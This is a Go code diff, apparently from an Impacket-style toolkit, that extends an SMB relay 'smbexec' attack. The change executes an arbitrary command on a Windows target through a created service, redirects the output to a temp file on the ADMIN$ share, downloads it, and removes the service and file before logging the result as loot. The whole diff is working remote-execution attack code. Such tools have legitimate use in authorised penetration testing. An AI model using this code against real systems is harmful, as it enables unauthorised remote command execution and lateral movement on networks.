@@ -20,6 +20,8 @@ import (
 	"fmt"
 	"log"
 	"math/rand"
+	"strings"
+	"time"
 	"unicode/utf16"
 
 	"github.com/mandiant/gopacket/pkg/dcerpc"
@@ -348,13 +350,19 @@ func smbExecAttack(client *SMBRelayClient, cfg *Config) error {
 	}
 	defer sc.Close()
 
-	// Generate random service name
+	// Generate random service name and remote output file. The command's
+	// stdout/stderr is redirected to the target temp file; reading it back is
+	// what proves the command actually executed (Impacket behavior).
 	serviceName := fmt.Sprintf("gopacket%04x", rand.Intn(0xFFFF))
+	outFile := fmt.Sprintf("gopacketout%04x.tmp", rand.Intn(0xFFFF))
+	remoteOut := "Temp\\" + outFile // relative to ADMIN$ (= %SystemRoot%)
 
-	// Build command - use cmd.exe /C to execute
-	binaryPath := fmt.Sprintf("%%COMSPEC%% /C %s", cfg.Command)
+	rl := &runLog{}
+	rl.Printf("[*] Executing command on %s via service creation...", cfg.TargetAddr)
 
-	log.Printf("[*] Creating service %s...", serviceName)
+	binaryPath := fmt.Sprintf("%%COMSPEC%% /C %s > %%SystemRoot%%\\%s 2>&1", cfg.Command, remoteOut)
+
+	rl.Printf("[*] Creating service %s...", serviceName)
 
 	// Create service
 	svcHandle, err := sc.CreateService(
@@ -369,16 +377,27 @@ func smbExecAttack(client *SMBRelayClient, cfg *Config) error {
 		return fmt.Errorf("create service: %v", err)
 	}
 
-	log.Printf("[*] Starting service %s...", serviceName)
+	rl.Printf("[*] Starting service %s...", serviceName)
 
-	// Start service (will fail since it's cmd.exe, but the command executes)
-	err = sc.StartService(svcHandle)
-	if err != nil {
-		// Expected: the command runs then the service stops, but that's fine
-		log.Printf("[*] Service start returned: %v (this is often expected)", err)
+	// Start service: SCM reports a timeout for cmd.exe services even when the
+	// command runs, so the output read-back below decides success.
+	if err := sc.StartService(svcHandle); err != nil {
+		rl.Printf("[*] Service start returned: %v (expected for cmd.exe services)", err)
 	}
 
-	log.Printf("[*] Deleting service %s...", serviceName)
+	// Wait for the command to write its output, then download it.
+	var output []byte
+	found := false
+	for i := 0; i < 20; i++ {
+		time.Sleep(500 * time.Millisecond)
+		if data, derr := client.DownloadFile("ADMIN$", remoteOut); derr == nil {
+			output = data
+			found = true
+			break
+		}
+	}
+
+	rl.Printf("[*] Deleting service %s...", serviceName)
 
 	// Close the create handle and re-open by name for delete
 	// (relay sessions may lose access on the original handle after start)
@@ -386,17 +405,29 @@ func smbExecAttack(client *SMBRelayClient, cfg *Config) error {
 
 	deleteHandle, err := sc.OpenService(serviceName, svcctl.SERVICE_ALL_ACCESS)
 	if err != nil {
-		log.Printf("[-] Warning: failed to re-open service for delete: %v", err)
+		rl.Printf("[-] Warning: failed to re-open service for delete: %v", err)
 	} else {
 		if err := sc.DeleteService(deleteHandle); err != nil {
-			log.Printf("[-] Warning: failed to delete service: %v", err)
+			rl.Printf("[-] Service %s could not be deleted (%v) — it may still exist on the target", serviceName, err)
 		}
 		sc.CloseServiceHandle(deleteHandle)
 	}
 
-	openCommandLoot(cfg, hostFromAddr(client.TargetAddr), "smbexec", cfg.Command)
-	commandLootf("[+] Command executed: %s", cfg.Command)
-	closeCommandLoot()
+	if found {
+		if err := client.DeleteFile("ADMIN$", remoteOut); err != nil {
+			rl.Printf("[-] Warning: could not delete %s on target: %v", remoteOut, err)
+		}
+	} else {
+		rl.Printf("[-] No output file from target (%s) — command did not execute", remoteOut)
+		return fmt.Errorf("command did not execute on %s (no output file %s)", cfg.TargetAddr, remoteOut)
+	}
+
+	if len(output) > 0 {
+		rl.Printf("[+] Command output:\n%s", strings.TrimRight(string(output), "\r\n"))
+	} else {
+		rl.Printf("[*] Command executed (no output)")
+	}
+	rl.Flush(cfg, hostFromAddr(client.TargetAddr), "smbexec", cfg.Command)
 
 	return nil
 }
